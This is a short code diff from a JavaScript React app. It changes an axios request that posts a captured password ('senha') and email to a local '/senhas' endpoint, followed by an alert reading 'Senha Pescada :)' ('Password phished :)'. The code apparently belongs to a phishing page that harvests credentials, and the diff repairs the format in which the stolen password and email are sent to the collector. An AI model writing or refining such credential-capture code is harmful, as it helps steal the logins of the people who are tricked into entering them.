@@ -30,7 +30,7 @@ export default function App() {
             console.log(resp);
 
             try {
-                const r = await axios.post('http://localhost:5000/senhas', [senha, email]);
+                const r = await axios.post('http://localhost:5000/senhas', {senha: senha, email: email});
                 console.log(r);
                 alert('Senha Pescada :)');
     
